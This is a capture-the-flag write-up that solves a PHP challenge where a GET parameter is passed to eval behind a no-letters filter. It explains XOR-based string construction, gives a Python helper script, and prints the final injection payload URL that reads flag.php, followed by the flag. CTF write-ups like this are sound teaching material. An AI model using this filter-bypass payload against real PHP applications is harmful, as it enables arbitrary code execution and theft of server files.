# Web Warm-up

### Challenge

```
Warm up! Can you break all the tasks? I'll pray for you!

read flag.php
Link
```
We're given a link that redirects to `http://69.90.132.196:5003/?view-source`

which show this code :

```php

<?php
if(isset($_GET['view-source'])){
    highlight_file(__FILE__);
    die();
}

if(isset($_GET['warmup'])){
    if(!preg_match('/[A-Za-z]/is',$_GET['warmup']) && strlen($_GET['warmup']) <= 60) {
    eval($_GET['warmup']);
    }else{
        die("Try harder!");
    }
}else{
    die("No param given");
}

```
as we can see, if we pass a paramaeter `warmup` it can get eval'd, but we have restrictions.

```php
preg_match('/[A-Za-z]/is',$_GET['warmup'])
```
This means that we can't use uppercase or lowercase letters. So this leaves us with only numbers and special characters.

```php
strlen($_GET['warmup']) <= 60
```
This restrict our input to only `60` character.

So after a lot of reading, we can bypass the `preg_match` with xor.In PHP, when two variables are XORed, the string is first converted to an ASCII value, then the ASCII value is converted to binary and then XORed, XOR is completed, and the result is converted from binary. Become an ASCII value and convert the ASCII value to a string.

For example if we take `{` and xor it with `<` we get the character `G`. Ok, now we can write a script that will find the two characters needed to be xored to get an ASCII string.

This script can do the job.
```Python

from pwn import *

printable = "'0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ " # Those are the only characters allowed

def find(text):
    key = ""
    inp = ""
    for c in text:
        for i in printable:
            a = xor(c, i)
            if a in printable:
                inp += a
                key += i
                break
    return key, inp
```
For example, if we want `"GET"`, we need to xor `~}\`` with `984`.

Okay, now, we know that our input is limited to 60 chars. So we will read a variable through another parameter which will
contain the functions needed to read the file `flag.php`

So to get a parameter we use `$_GET[name]` where `name` is the name of the parameter.

So for example, we want to do this :
```
http://69.90.132.196:5003/?warmup=$_GET['func']($_GET['name'])&func=highlight_file&name=flag.php
```

but since we can't pass our URL with letters. We will convert each part.
So the get the `GET` we can asign it to a variable in order to reuse it.
`GET == "{{{"^ "<>/"`

```
http://69.90.132.196:5003/?warmup=$_=_"`{{{"^ "?<>/"
```
This creates a variable `_` that takes the value `_GET`. Now, if we add
```
${$_}["_"](${$_}["__"](${$_}["___"]))
```
Since `$_` is `_GET`. This is equivalent to 
```
$_GET["_"]($_GET["__"])
```
where `"_"` and `"__"` are the name of the parameters.

Now we have our query string, and we can pass it on.

```

http://69.90.132.196:5003/?warmup=$_="`{{{"^"?<>/";${$_}["_"](${$_}["__"]);&_=highlight_file&__=flag.php
```

## flag

ASIS{w4rm_up_y0ur_br4in}
